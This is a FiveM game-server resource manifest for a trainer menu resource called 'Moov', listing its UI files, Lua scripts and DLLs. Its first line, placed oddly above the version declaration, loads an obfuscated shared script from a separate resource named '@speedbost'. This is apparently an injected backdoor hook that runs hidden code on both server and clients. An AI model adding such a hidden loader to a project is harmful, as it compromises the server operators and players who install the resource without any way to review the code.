shared_script '@speedbost/ai_module_fg-obfuscated.lua'
fx_version "cerulean"
game "gta5"
lua54 'yes'
description "Moov"

ui_page "nui/trainer.html"

files {
    "nui/mellotrainer.json",
    "nui/trainer.html",
    "nui/trainer.js",
    "nui/trainer.css",
    "nui/Changa.ttf",
}

shared_scripts {
    'config.lua',
}
version '2.2'

client_scripts {
    'dont_tuch/cl_utils.lua',
    'dont_tuch/ur.lua',
    'dont_tuch/vehicles.lua',
    'dont_tuch/client.lua',
    'weathermenu/WeatherMenu.Client.net.dll',

}

server_scripts {
    'dont_tuch/server.lua',
}

file "i18n/en.json"

file "weathermenu/LemonUI.FiveM.dll"
file "weathermenu/Newtonsoft.Json.dll"

